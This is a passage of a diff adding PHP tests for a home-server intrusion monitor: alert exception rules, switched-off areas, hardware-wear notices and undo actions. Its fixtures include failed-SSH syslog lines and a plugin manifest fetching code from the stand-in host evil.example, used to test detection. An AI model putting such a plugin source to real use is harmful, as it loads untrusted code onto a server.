+            foreach ([watchmanEntryKey($x), 'check.hw_wear', 'notify.hw_wear', 'fold.hw_wear'] as $key) {
+                $text = officeNotifyText('watchman', $key, ['n' => 2] + watchmanHwText($x), $lang);
+                if ($text === $key || preg_match('/\{[a-z_]+\}/', $text)) {
+                    $left[] = "$lang $key: $text";
+                }
+            }
+        }
+    }
+    same('words: every shape in five languages, every placeholder filled', [], $left);
+
+    // a whole round: hw.json keeps the history, the page lists the disks, the entry lies in book-more.json
+    $src = "$tmp/src";
+    $data = "$tmp/round";
+    foreach (['plugins', 'extra', 'ssh/root'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $rp = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+           'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
+           'etc_passwd' => "$src/passwd", 'hw' => ['tainted' => "$src/tainted", 'ram' => "$tmp/ram/watchman-hw.json"], 'hw_file' => "$data/hw.json",
+           'smart' => $smart, 'disks_ini' => "$tmp/disks.ini"];
+    file_put_contents($rp['syslog'], '');
+    file_put_contents($rp['passwd'], "root:x:0:0::/root:/bin/bash\n");
+    foreach (['go', 'shadow', 'sec', 'sec_nfs', 'share_cfg'] as $k) {
+        file_put_contents($rp[$k], '');
+    }
+    file_put_contents("$src/tainted", "0\n");
+    $ata([]);
+    watchmanRound($rp, $data, 1000, $now, fn () => [], false);
+    $ata([197 => 4]);
+    $r = watchmanRound($rp, $data, 1000, $now + 300, fn () => [], false);
+    $page = watchmanPageState($data, $now + 310, false);
+    same('round: pending sectors grow — told; hw.json keeps the disks; the page lists them; the entry in book-more.json',
+        [['hw_wear'], ['hw_wear'], ['WDC_WD80EFAX_7HJ1', 'Samsung_SSD_980_PRO_1TB_S5GX'], 3, ['hw_wear']],
+        [$r['added'], array_column($r['told'], 'kind'), array_keys(readJson("$data/hw.json")['wear']['disks'] ?? []), count($page['hw']['wear'] ?? []),
+         array_column(readJson("$data/book-more.json")['entries'] ?? [], 'kind')]);
+    $r = watchmanRound($rp, $data, 2000, $now + 600, fn () => [], false);
+    same('round: hired anew — what the disks say now is normal, nothing told', [], array_values(array_filter($r['added'], fn ($k) => $k === 'hw_wear')));
+    hardeningRm($tmp);
+}
+
+/**
+ * The night watchman's exceptions and areas switched off (1.96 step 4, agent/desks/watchman-rules.php): every kind either
+ * asked about more clearly or not; every rule shape — what it covers and what not; the offers a click may make (narrow
+ * only, a net only for a private address, never failures or a new SMB user by a net); the pass (noted by the rule, the
+ * same again one line, never a chain forming, never `again` older than the decision, an area off made normal and left
+ * out); a real round (let through, not told, counted; outside the net told; lifted: told again; without rules.json — an
+ * older office — told again: louder, never quieter); the night's copy (foreign v: none); the actions (asked more
+ * clearly, undo, an area off and on, the Team Lead's hint); rules.json tolerant (unknown keys and rules kept).
+ */
+function testWatchmanRules(): void
+{
+    same('rules: every kind either asked about more clearly or not — none in both, none forgotten', [[], []],
+        [array_values(array_diff(array_keys(WATCH_KINDS), WATCH_RULE_ASK, WATCH_RULE_PLAIN)), array_values(array_intersect(WATCH_RULE_ASK, WATCH_RULE_PLAIN))]);
+    same('rules: … and neither list names a kind he doesn\'t have', [], array_values(array_diff(array_merge(WATCH_RULE_ASK, WATCH_RULE_PLAIN), array_keys(WATCH_KINDS))));
+
+    // the shapes: only exactly one of them
+    same('rules: the shapes of `on`', [['key' => 'login_failures:1.2.3.4'], ['ip' => '203.0.113.7'], ['net' => '192.168.1.0/24'], ['user' => 'root', 'net' => '192.168.1.0/24'],
+        ['machine' => 'LAPTOP'], ['net' => 'fd00:1:2:3::/64'], null, null, null, null, null, null, null],
+        array_map('watchmanRuleOn', [['key' => 'login_failures:1.2.3.4'], ['ip' => '203.0.113.7'], ['net' => '192.168.1.0/24'], ['net' => '192.168.1.0/24', 'user' => 'root'],
+            ['machine' => 'LAPTOP'], ['net' => 'fd00:1:2:3::/64'], ['net' => '192.168.1.7/24'], ['net' => '192.168.1.0/33'], ['ip' => 'nope'], ['key' => ''],
+            ['user' => 'ro ot', 'net' => '10.0.0.0/8'], ['ip' => '1.2.3.4', 'net' => '1.2.3.0/24'], 'x']));
+    $rule = fn (array $on, array $kinds, string $cat = 'login', int $at = 1000) => watchmanRuleShaped(['id' => 'r' . substr(md5(json_encode([$on, $kinds, $at])), 0, 10),
+        'cat' => $cat, 'kinds' => $kinds, 'on' => $on, 'at' => $at]);
+    $e = fn (string $kind, string $key, array $p) => watchmanEntry($kind, $key, 2000, $p);
+    $login = fn (string $ip, array $users = ['root']) => $e('login_new_ip', "login_new_ip:$ip", ['ip' => $ip, 'users' => $users, 'services' => ['web']]);
+    $cases = [
+        // [what, rule on, rule kinds, entry, covers?]
+        ['key: exactly this thing', ['key' => 'login_new_ip:192.168.1.7'], ['login_new_ip'], $login('192.168.1.7'), true],
+        ['key: another thing of the kind', ['key' => 'login_new_ip:192.168.1.7'], ['login_new_ip'], $login('192.168.1.8'), false],
+        ['key: the same key, another kind', ['key' => 'login_failures:192.168.1.7'], ['login_failures'], $e('login_new_ip', 'login_failures:192.168.1.7', ['ip' => '192.168.1.7']), false],
+        ['ip: the address', ['ip' => '203.0.113.7'], WATCH_RULE_LOGIN, $login('203.0.113.7'), true],
+        ['ip: another address', ['ip' => '203.0.113.7'], WATCH_RULE_LOGIN, $login('203.0.113.8'), false],
+        ['ip: failures from it — not its kinds', ['ip' => '203.0.113.7'], WATCH_RULE_LOGIN, $e('login_failures', 'login_failures:203.0.113.7', ['ip' => '203.0.113.7']), false],
+        ['net: an address in it', ['net' => '192.168.1.0/24'], WATCH_RULE_LOGIN, $login('192.168.1.200'), true],
+        ['net: an SMB machine in it', ['net' => '192.168.1.0/24'], WATCH_RULE_LOGIN, $e('smb_client', 'smb_client:192.168.1.9', ['ip' => '192.168.1.9', 'users' => ['benj']]), true],
+        ['net: an SMB session at an odd hour in it', ['net' => '192.168.1.0/24'], WATCH_RULE_LOGIN, $e('smb_hour', 'smb_hour:192.168.1.9', ['ip' => '192.168.1.9']), true],
+        ['net: an address outside', ['net' => '192.168.1.0/24'], WATCH_RULE_LOGIN, $login('192.168.2.1'), false],
+        ['net: a burst of failures from inside — never by a net', ['net' => '192.168.1.0/24'], WATCH_RULE_LOGIN, $e('login_failures', 'login_failures:192.168.1.5', ['ip' => '192.168.1.5']), false],
+        ['net: a new SMB user from inside — never by a net', ['net' => '192.168.1.0/24'], WATCH_RULE_LOGIN, $e('smb_user', 'smb_user:eve', ['user' => 'eve', 'ip' => '192.168.1.5']), false],
+        ['net: an entry without an address', ['net' => '192.168.1.0/24'], WATCH_RULE_LOGIN, $e('login_new_ip', 'login_new_ip:x', []), false],
+        ['net: IPv6 in its /64', ['net' => 'fd00:1:2:3::/64'], WATCH_RULE_LOGIN, $login('fd00:1:2:3::99'), true],
+        ['net: IPv6 outside', ['net' => 'fd00:1:2:3::/64'], WATCH_RULE_LOGIN, $login('fd00:1:2:4::99'), false],
+        ['net: IPv4 against an IPv6 net', ['net' => 'fd00:1:2:3::/64'], WATCH_RULE_LOGIN, $login('192.168.1.1'), false],
+        ['user and net: root from inside', ['user' => 'root', 'net' => '192.168.1.0/24'], ['login_new_ip'], $login('192.168.1.7', ['root']), true],
+        ['user and net: another user', ['user' => 'root', 'net' => '192.168.1.0/24'], ['login_new_ip'], $login('192.168.1.7', ['benj']), false],
+        ['user and net: root and another user', ['user' => 'root', 'net' => '192.168.1.0/24'], ['login_new_ip'], $login('192.168.1.7', ['root', 'benj']), false],
+        ['user and net: root from outside', ['user' => 'root', 'net' => '192.168.1.0/24'], ['login_new_ip'], $login('10.0.0.7', ['root']), false],
+        ['machine: at any hour', ['machine' => 'LAPTOP'], ['smb_hour'], $e('smb_hour', 'smb_hour:192.168.1.9', ['ip' => '192.168.1.9', 'machine' => 'LAPTOP']), true],
+        ['machine: another machine', ['machine' => 'LAPTOP'], ['smb_hour'], $e('smb_hour', 'smb_hour:192.168.1.9', ['ip' => '192.168.1.9', 'machine' => 'DESK']), false],
+    ];
+    foreach ($cases as [$what, $on, $kinds, $entry, $want]) {
+        $r = $rule($on, $kinds);
+        same("rules: covers — $what", $want, $r !== null && watchmanRuleCovers($r, $entry));
+    }
+    same('rules: a kind outside the area\'s is no rule at all', null, $rule(['key' => 'x'], ['plugin_new']));
+
+    // the offers: narrow only
+    $types = fn (array $entry, array $book = []) => array_map(fn ($o) => [$o['type'], $o['ask']], watchmanRuleOffers($entry, $book ?: [$entry]));
+    same('offers: a login from a private address, one user — the user from its /24, the /24, this one', [['user_net', false], ['net', false], ['key', false]], $types($login('192.168.1.7')));
+    same('offers: … the net is the address\'s /24 (IPv6: /64)', ['192.168.1.0/24', 'fd00:1:2:3::/64'],
+        [watchmanRuleOffers($login('192.168.1.7'), [])[1]['on']['net'] ?? null, watchmanRuleOffers($login('fd00:1:2:3::99'), [])[1]['on']['net'] ?? null]);
+    same('offers: a public address — only itself, and this one', [['ip', false], ['key', false]], $types($login('203.0.113.7')));
+    same('offers: failures — only this one, asked more clearly', [['key', true]], $types($e('login_failures', 'login_failures:192.168.1.5', ['ip' => '192.168.1.5'])));
+    same('offers: an SMB session at an odd hour — the machine first', [['machine', false], ['net', false], ['key', false]],
+        $types($e('smb_hour', 'smb_hour:192.168.1.9', ['ip' => '192.168.1.9', 'users' => ['benj'], 'machine' => 'LAPTOP'])));
+    same('offers: a change of go (any area: «this one») — asked more clearly', [['key', true]], $types($e('flash_go', 'flash_go', ['lines' => ['x']])));
+    $noted = $login('192.168.1.7');
+    $noted['noted'] = 1;
+    same('offers: none on an entry noted already, none on his own lines', [[], []], [watchmanRuleOffers($noted, []), watchmanRuleOffers(['kind' => 'watch', 'key' => 'x'] + $login('1.2.3.4'), [])]);
+    $book = [$login('192.168.1.7'), $login('192.168.1.8'), $login('192.168.2.8')];
+    same('offers: how many open entries each would cover (root from the /24: both of root\'s logins there)', [2, 2, 1], array_column(watchmanRuleOffers($book[0], $book), 'covers'));
+
+    // the pass
+    $now = 5000;
+    $rules = fn (array $list, array $off = []) => watchmanRules(['rules' => $list, 'off' => $off]);
+    $net = ['id' => 'r0000000001', 'cat' => 'login', 'kinds' => WATCH_RULE_LOGIN, 'on' => ['net' => '192.168.1.0/24'], 'at' => 1000];
+    $pass = function (array $book, array $before, array $rs, array $inc = [], ?array &$b = null, ?array &$st = null) use ($now): array {
+        $b ??= ['ips' => [], 'fail_ips' => []];
+        $st ??= [];
+        $res = watchmanRulesApply($book, $before, $b, [], $rs, $inc, $st, $now);
+        return [$book, $res];
+    };
+    $st = [];
+    [$bk, $res] = $pass([$login('192.168.1.7'), $login('192.168.2.7')], [], $rules([$net]), [], $b, $st);
+    same('pass: the one in the net noted by the rule (by rule, its id), the other open; a hit counted', [['rule', 'r0000000001', false], [null, null, true], ['noted' => 1, 'merged' => 0, 'off' => 0, 'known' => 0, 'quiet' => 0], 1],
+        [[$bk[0]['by'], $bk[0]['rule'], watchmanOpen($bk[0])], [$bk[1]['by'], $bk[1]['rule'] ?? null, watchmanOpen($bk[1])], $res, $st['rule_hits']['r0000000001']['n'] ?? 0]);
+    same('pass: noted by the rule is never told (watchmanNotifyDue sees only the open one)', ['192.168.2.7'],
+        (function () use ($bk) { $book = $bk; $s = []; watchmanNotifyDue($book, $s, 9000, false); return array_values(array_map(fn ($e) => $e['p']['ip'], array_filter($book, fn ($e) => !empty($e['told']) || (watchmanOpen($e) && $e['kind'] === 'login_new_ip')))); })());
+    $again = $login('192.168.1.7');
+    $again['count'] = 3;
+    [$bk2] = $pass(array_merge($bk, [$again]), array_flip(array_column($bk, 'id')), $rules([$net]), [], $b, $st);
+    same('pass: the same thing again brings the rule\'s line up to date — no second line', [2, 4, 2], [count($bk2), $bk2[0]['count'], $st['rule_hits']['r0000000001']['n']]);
+    [$bk3, $r3] = $pass([$login('192.168.1.7')], [], watchmanRules([]));
+    same('pass: no rules — nothing changes', [true, ['noted' => 0, 'merged' => 0, 'off' => 0, 'known' => 0, 'quiet' => 0]], [watchmanOpen($bk3[0]), $r3]);
+    $inc = $login('192.168.1.7');
+    $inc['again'] = 'wincident01';
+    [$bk4] = $pass([$inc], [], $rules([$net]), ['wincident01' => 1500]);
+    $later = ['at' => 1600] + $net;
+    [$bk5] = $pass([$inc], [], $rules([$later]), ['wincident01' => 1500]);
+    same('pass: the same as a serious incident — not by an older rule, by one made after it (your newest decision)', [true, false], [watchmanOpen($bk4[0]), watchmanOpen($bk5[0])]);
+    $cron = $e('cron_new', 'cron_new:x', ['line' => '* * * * * x']);
+    $cron['time'] = $cron['last'] = $now - 10;
+    $acc = $login('192.168.1.7');
+    $acc['time'] = $acc['last'] = $now - 20;
+    [$bk6] = $pass([$acc, $cron], [], $rules([$net]));
+    same('pass: a login that forms a chain with a new cron line stays open — the chain is told', [true, true], [watchmanOpen($bk6[0]), watchmanOpen($bk6[1])]);
+    $bOff = ['ips' => [], 'fail_ips' => []];
+    $stOff = [];
+    [$bk7, $r7] = $pass([$login('192.168.9.9'), $e('plugin_new', 'plugin_new:x', ['name' => 'x', 'source' => 's'])], [], $rules([], ['login' => ['at' => 1000]]), [], $bOff, $stOff);
+    same('pass: an area switched off — its new entry left out and made normal, the others as before', [['plugin_new'], ['192.168.9.9'], 1],
+        [array_column($bk7, 'kind'), array_keys($bOff['ips']), $r7['off']]);
+
+    // rules.json: tolerant, bounded
+    $raw = ['v' => 1, 'future' => ['x' => 1], 'rules' => [$net, ['id' => 'r0000000002', 'cat' => 'login', 'kinds' => ['login_new_ip'], 'on' => ['vlan' => 7], 'at' => 1], 'junk'],
+            'off' => ['login' => ['at' => 5], 'nope' => ['at' => 1]]];
+    same('rules.json: only rules in exactly their shape apply, unknown areas switched off none', [['r0000000001'], ['login' => 5]],
+        [array_column(watchmanRules($raw)['rules'], 'id'), watchmanRules($raw)['off']]);
+    $many = array_map(fn ($i) => ['id' => sprintf('r%010x', $i), 'cat' => 'login', 'kinds' => ['login_new_ip'], 'on' => ['key' => "k$i"], 'at' => 1], range(1, 60));
+    same('rules.json: 50 rules per area at most', 50, count(watchmanRules(['rules' => $many])['rules']));
+
+    // a real round
+    $tmp = hardeningTmp('watch-rules');
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    foreach (['plugins', 'extra', 'ssh/root'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini",
+              'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd"];
+    $t0 = strtotime('2026-11-20 10:00:00');
+    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
+    file_put_contents($paths['syslog'], $line($t0 - 3600, 'webgui: Successful login user root from 192.168.20.10'));
+    file_put_contents($paths['go'], "#!/bin/bash\n/usr/local/sbin/emhttp &\n");
+    file_put_contents($paths['passwd'], "root:x:0:0:Console and webGui login account:/root:/bin/bash\n");
+    file_put_contents($paths['shadow'], 'root:$6$aa$bb:20000:0:99999:7:::' . "\n");
+    file_put_contents($paths['sec'], "[\"appdata\"]\nexport=\"e\"\nsecurity=\"private\"\n");
+    file_put_contents($paths['sec_nfs'], "");
+    file_put_contents($paths['share_cfg'], "shareSMBEnabled=\"yes\"\nshareNFSEnabled=\"no\"\n");
+    $docker = fn () => [];
+    $notified = "$tmp/notified";
+    file_put_contents("$tmp/notify", "#!/bin/bash\necho \"\$@\" >> " . escapeshellarg($notified) . "\n");
+    chmod("$tmp/notify", 0755);
+    $envBefore = getenv('OFFICE_NOTIFY_BIN');
+    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
+    $told = fn () => substr_count((string) @file_get_contents($notified), ' -l /');       // one per notification (its link)
+    $login = fn (int $t, string $ip) => file_put_contents($paths['syslog'], $line($t, "webgui: Successful login user root from $ip"), FILE_APPEND);
+    $byIp = fn () => array_map(fn ($x) => [$x['p']['ip'], $x['by'], $x['count']], array_values(array_filter(watchmanLoad($data)['book'], fn ($x) => $x['kind'] === 'login_new_ip')));
+    watchmanRound($paths, $data, 1000, $t0, $docker, true, "$tmp/acks.json");
+    file_put_contents("$data/rules.json", json_encode(['v' => 1, 'rules' => [['id' => 'r00000000aa', 'cat' => 'login', 'kinds' => WATCH_RULE_LOGIN, 'on' => ['net' => '192.168.50.0/24'],
+        'at' => $t0, 'from' => 'hand', 'note' => 'the kids\' tablets']], 'keep' => 'this']));
+    $login($t0 + 100, '192.168.50.7');
+    watchmanRound($paths, $data, 1000, $t0 + 300, $docker, true, "$tmp/acks.json");
+    same('round: a login from the net let through — noted by the rule, nothing told, counted', [[['192.168.50.7', 'rule', 1]], 0, 1],
+        [$byIp(), $told(), watchmanLoad($data)['state']['rule_hits']['r00000000aa']['n'] ?? 0]);
+    $login($t0 + 400, '192.168.50.7');
+    $login($t0 + 410, '192.168.60.9');
+    watchmanRound($paths, $data, 1000, $t0 + 600, $docker, true, "$tmp/acks.json");
+    same('round: again from it — the same line counts up; from outside the net — open and told', [[['192.168.50.7', 'rule', 2], ['192.168.60.9', null, 1]], 1],
+        [$byIp(), $told()], (string) @file_get_contents($notified));
+    $pg = watchmanPageState($data, $t0 + 600, false);
+    same('page: the rule with its hits, the line noted by it, the offers on the open one', [1, 2, 'r00000000aa', ['user_net', 'net', 'key']],
+        [count($pg['rules']), $pg['rules'][0]['hits'], array_values(array_filter($pg['book'], fn ($x) => ($x['by'] ?? null) === 'rule'))[0]['rule'] ?? null,
+         array_column(array_values(array_filter($pg['book'], fn ($x) => $x['open']))[0]['offers'] ?? [], 'type')]);
+    // the night shift counts its own hits from none (its state is made anew): at the handover they add to the day's
+    $hd = watchmanNightState(['rule_hits' => ['r00000000aa' => ['n' => 2, 'last' => $t0 + 600, 'key' => 'day'], 'r00000000bb' => ['n' => 1, 'last' => $t0 + 50, 'key' => 'b']]],
+        ['rule_hits' => ['r00000000aa' => ['n' => 3, 'last' => $t0 + 5000, 'key' => 'night'], 'r00000000cc' => ['n' => 1, 'last' => $t0 + 4000, 'key' => 'c'],
+                         'r00000000dd' => ['n' => 0, 'last' => $t0], 7 => ['n' => 4], 'r00000000ee' => 'x']], $t0 + 6000);
+    same('handover: the night\'s rule hits added to the day\'s (newest time and words), a rule only the night met joins, nothing odd taken',
+        ['r00000000aa' => ['n' => 5, 'last' => $t0 + 5000, 'key' => 'night'], 'r00000000bb' => ['n' => 1, 'last' => $t0 + 50, 'key' => 'b'],
+         'r00000000cc' => ['n' => 1, 'last' => $t0 + 4000, 'key' => 'c']], $hd['rule_hits']);
+    same('handover: a night without hits leaves the day\'s as they are', ['r00000000aa' => ['n' => 2]], watchmanNightState(['rule_hits' => ['r00000000aa' => ['n' => 2]]], [], $t0)['rule_hits']);
+    watchmanMirrorWrite($data, "$tmp/mirror.json", null, $t0 + 650, 'boot-a');
+    @mkdir("$tmp/night", 0700);
+    watchmanNightBegin($paths, "$tmp/night", $t0 + 700, "$tmp/mirror.json", null, 'boot-a');
+    same('night begin: the day has hits, the night\'s state none (else they would count twice at the handover)', [true, false],
+        [isset(watchmanLoad($data)['state']['rule_hits']['r00000000aa']), isset(watchmanLoad("$tmp/night")['state']['rule_hits'])]);
+    // an older office on this data folder: no rules.json read — it tells again (louder, never quieter); its lines stay noted
+    rename("$data/rules.json", "$tmp/rules.json");
+    $login($t0 + 700, '192.168.50.7');
+    watchmanRound($paths, $data, 1000, $t0 + 900, $docker, true, "$tmp/acks.json");
+    same('round without rules.json (as an older office): told again, the rule\'s line still noted', [[['192.168.50.7', 'rule', 2], ['192.168.60.9', null, 1], ['192.168.50.7', null, 1]]],
+        [$byIp()]);
+    rename("$tmp/rules.json", "$data/rules.json");
+
+    // the actions (as the page sends them)
+    $open = array_values(array_filter(watchmanLoad($data)['book'], 'watchmanOpen'));
+    $ip60 = array_values(array_filter($open, fn ($x) => ($x['p']['ip'] ?? '') === '192.168.60.9'))[0];
+    $res = watchmanRuleAdd($ip60['id'], 'net', false, $data, $t0 + 1000, false);
+    $raw = watchmanRulesRaw($data);
+    same('rule_add: the /24 from the entry as it is now (never a net from the page), the entry noted, unknown keys kept', ['192.168.60.0/24', 1, 'this', $ip60['id']],
+        [$raw['rules'][1]['on']['net'] ?? null, $res['noted'], $raw['keep'] ?? null, $raw['rules'][1]['from'] ?? null]);
+    $err = fn (callable $f) => (function () use ($f) { try { $f(); return null; } catch (Problem $p) { return $p->key; } })();
+    same('rule_add: an entry not open, a type not offered, a bad id — refused', ['watch_gone', 'bad_request', 'bad_request'],
+        [$err(fn () => watchmanRuleAdd($ip60['id'], 'net', false, $data, null, false)),
+         $err(fn () => watchmanRuleAdd(array_values(array_filter(watchmanLoad($data)['book'], 'watchmanOpen'))[0]['id'], 'vlan', false, $data, null, false)),
+         $err(fn () => watchmanRuleAdd('x', 'net', false, $data, null, false))]);
+    file_put_contents($paths['syslog'], implode('', array_map(fn ($i) => $line($t0 + 1100 + $i, 'sshd[7]: Failed password for root from 192.168.50.66 port ' . (4000 + $i) . ' ssh2'), range(0, 6))), FILE_APPEND);
+    watchmanRound($paths, $data, 1000, $t0 + 1200, $docker, true, "$tmp/acks.json");
+    $fail = array_values(array_filter(watchmanLoad($data)['book'], fn ($x) => $x['kind'] === 'login_failures' && watchmanOpen($x)));
+    same('round: a burst of failures from inside the net — never covered by it, open', 1, count($fail));
+    same('rule_add: failures asked about more clearly — without the clear yes refused, with it made', ['watch_rule_ask', 1],
+        [$err(fn () => watchmanRuleAdd($fail[0]['id'], 'key', false, $data, null, false)), watchmanRuleAdd($fail[0]['id'], 'key', true, $data, $t0 + 1300, false)['noted']]);
+    $rid = watchmanRulesRaw($data)['rules'][2]['id'];
+    same('rule_remove: undo — the rule gone, its entry open again', [1, true],
+        [watchmanRuleRemove($rid, true, $data, false)['reopened'], watchmanOpen(array_values(array_filter(watchmanLoad($data)['book'], fn ($x) => $x['id'] === $fail[0]['id']))[0])]);
+    same('rule_remove: lifting one not there', 'watch_rule_gone', $err(fn () => watchmanRuleRemove($rid, false, $data, false)));
+    watchmanRuleRemove('r00000000aa', false, $data, false);
+    $login($t0 + 1400, '192.168.50.7');
+    watchmanRound($paths, $data, 1000, $t0 + 1500, $docker, true, "$tmp/acks.json");
+    same('lifted: the next login from that net is open again (the baseline never learnt it)', true,
+        (bool) array_filter(watchmanLoad($data)['book'], fn ($x) => ($x['p']['ip'] ?? '') === '192.168.50.7' && watchmanOpen($x)));
+    // gap 1 (concept 12.1): an area off makes a state normal (a login's address), never a usual value (a pull, an SMB
+    // machine's hours) or failed logins — a big pull while off never raises the threshold for good
+    $ob = ['ips' => [], 'fail_ips' => [], 'flow' => ['since' => 1, 'smb_users' => [], 'smb_clients' => [], 'ack' => []]];
+    $obk = [watchmanEntry('flow_client', 'flow_client:192.168.1.9|smb', 100, ['ip' => '192.168.1.9', 'service' => 'smb', 'peak' => 80 * 1024 ** 3, 'hour' => 80 * 1024 ** 3]),
+            watchmanEntry('login_failures', 'login_failures:203.0.113.4', 100, ['ip' => '203.0.113.4', 'users' => [], 'services' => ['ssh']]),
+            watchmanEntry('login_new_ip', 'login_new_ip:192.168.1.7', 100, ['ip' => '192.168.1.7', 'users' => ['root'], 'services' => ['web']])];
+    $ost = [];
+    $ores = watchmanRulesApply($obk, [], $ob, [], ['rules' => [], 'off' => ['pull' => 50, 'login' => 50], 'known' => []], [], $ost, 200);
+    same('area off: all three dropped; the pull\'s «usual» untouched, the guessing address never known; the login\'s address normal',
+        [3, [], [], ['192.168.1.7']], [$ores['off'], $obk, $ob['flow']['ack'], array_keys($ob['ips']) === [] ? [] : array_keys($ob['ips'])]);
+    same('area off: failed logins never counted quietly afterwards', [], $ob['fail_ips']);
+    // gap 2 (concept 12.1): «Take back» puts the thing itself out of what is normal for the 1.96 parts — told again
+    $takeBack = function (string $kind, callable $compare, callable $adopt) {
+        $b = [];
+        $book = [];
+        $compare($b, $book);                            // the first look: normal
+        $book = [];
+        $compare($b, $book, true);                      // changed: an entry (the router's MAC: a round later)
+        $compare($b, $book, true);
+        $e = array_values(array_filter($book, fn ($x) => $x['kind'] === $kind))[0] ?? null;
+        if ($e === null) {
+            return 'no entry';
+        }
+        $adopt($b, $e);                                 // «I know, thanks»
+        $book = [];
+        $compare($b, $book, true);
+        $quiet = !array_filter($book, fn ($x) => $x['kind'] === $kind);
+        watchmanUnadopt($b, $kind, (array) $e['p'] + ['key' => (string) $e['key']]);     // «Take back», as watchmanKnownRemove() does
+        $book = [];
+        $compare($b, $book, true);
+        $compare($b, $book, true);                      // the kinds that wait a round
+        return [$quiet, (bool) array_filter($book, fn ($x) => $x['kind'] === $kind)];
+    };
+    $boot = function (string $id) {
+        return function (array &$b, array &$book, bool $changed = false) use ($id) {
+            $seen = ['files' => [$id => ['size' => 1, 'time' => 1, 'h' => $changed ? 'b' : 'a']], 'looked' => [explode(':', $id)[0]], 'installed' => []];
+            $b['flash']['boot'] ??= null;
+            watchmanBootCompare($b['flash']['boot'], $seen, $book, 100);
+        };
+    };
+    $bootSeen = fn (string $id) => ['flash' => ['boot' => ['files' => [$id => ['size' => 1, 'time' => 1, 'h' => 'b']]]]];
+    $gw = function (array &$b, array &$book, bool $changed = false) {
+        $b['lan'] ??= null;
+        watchnetGatewayCompare($b['lan'], ['gw' => ['ip' => '192.168.1.1', 'mac' => $changed ? '02:00:00:00:00:02' : '02:00:00:00:00:01', 'iface' => 'br0'],
+            'dns' => $changed ? ['9.9.9.9'] : ['192.168.1.1']], $book, 100);
+    };
+    $gwSeen = ['lan' => ['dns' => ['9.9.9.9']]];
+    same('take back: a start file, ld.so.preload, the router\'s MAC, the DNS — quiet after «I know», told again after «Take back»',
+        [[true, true], [true, true], [true, true], [true, true]],
+        [$takeBack('flash_boot', $boot('stop'), fn (&$b, $e) => watchmanBootAdopt($b, $e, $bootSeen('stop'))),
+         $takeBack('ld_preload', $boot('preload'), fn (&$b, $e) => watchmanBootAdopt($b, $e, $bootSeen('preload'))),
+         $takeBack('net_gateway', $gw, fn (&$b, $e) => watchnetGatewayAdopt($b, $e, $gwSeen, 100)),
+         $takeBack('net_dns', $gw, fn (&$b, $e) => watchnetGatewayAdopt($b, $e, $gwSeen, 100))]);
+    $pv = ['plugins' => ['a' => ['source' => 'github.com/x', 'version' => '2', 'seen' => 1]], 'containers' => ['web' => ['tokens' => [], 'seen' => 1]]];
+    watchmanUnadopt($pv, 'plugin_version', ['name' => 'a', 'version' => '2', 'old' => '1']);
+    watchmanUnadopt($pv, 'container_plain', ['name' => 'web']);
+    same('take back: a plugin\'s version back to the one before (noted again), a plain container out of what is normal (seen anew)', ['1', false],
+        [$pv['plugins']['a']['version'], isset($pv['containers']['web'])]);
+    // gap 5 (concept 12.1): an area switched off tells nothing — also an entry open from before it went off; «Known
+    // vulnerabilities» switched off is grey even with a line still open
+    $nb = [watchmanEntry('login_new_ip', 'login_new_ip:203.0.113.8', 100, ['ip' => '203.0.113.8', 'users' => ['root'], 'services' => ['ssh']])];
+    $nst = [];
+    $nb2 = $nb;
+    $nst2 = [];
+    same('area off: an open login line not told while «Logins» is off; told with it on', [[], ['login_new_ip']],
+        [watchmanNotifyDue($nb, $nst, 100000, false, 'en', ['login' => 50]), array_column(watchmanNotifyDue($nb2, $nst2, 100000, false, 'en'), 'kind')]);
+    same('area off: … and still untold (told once it is on again)', [true, false], [empty($nb[0]['told']), empty($nb2[0]['told'])]);
+    $vl = watchmanCats(['hired' => true, 'on_watch' => 1, 'time' => 1000, 'vuln' => ['on' => false],
+        'book' => [['id' => 'w0000000001', 'kind' => 'vuln_known', 'open' => true, 'tell' => true, 'last' => 900]]])['areas']['vuln'];
+    $ss = watchmanCats(['hired' => true, 'on_watch' => 1, 'time' => 1000, 'round' => ['time' => 990, 'skipped' => 4096]])['areas'];
+    same('12.1: syslog bytes skipped — the server itself and the hardware say their signs may be missing', [true, true],
+        [in_array('syslog_signs', $ss['host']['why'], true), in_array('syslog_signs', $ss['hw']['why'], true)]);
+    $fs = watchmanFlowSummary(['since' => 1, 'smb_users' => [], 'smb_clients' => [], 'ack' => []], [], 1000, watchmanSettings(['set' => ['pull' => ['factor' => 6, 'new' => 80]]]));
+    same('12.1: the help\'s limits are the settings in effect, not the old constants', [6, 80 * 1024 ** 3], [$fs['limits']['factor'] ?? null, $fs['limits']['new'] ?? null]);
+    same('vuln off with an affected line still open: grey, it says off (never red while he doesn\'t look)', ['none', ['vuln_off'], 1], [$vl['level'], $vl['why'], $vl['open']]);
+    same('cat_off: off only with the clear yes', 'watch_rule_ask', $err(fn () => watchmanCatOff('plugin', true, false, $data, null, false)));
+    watchmanCatOff('plugin', true, true, $data, $t0 + 1600, false);
+    file_put_contents("$src/plugins/new.plg", "<PLUGIN name=\"new\" version=\"1\" pluginURL=\"https://evil.example/new.plg\">\n");
+    $toldBefore = $told();
+    watchmanRound($paths, $data, 1000, $t0 + 1800, $docker, true, "$tmp/acks.json");
+    $d = watchmanLoad($data);
+    same('area off: a new plugin — nothing in the book, nothing told, made normal underneath', [[], 0, true],
+        [array_values(array_filter($d['book'], fn ($x) => $x['kind'] === 'plugin_new')), $told() - $toldBefore, isset($d['baseline']['plugins']['new'])]);
+    $pg = watchmanPageState($data, $t0 + 1800, false);
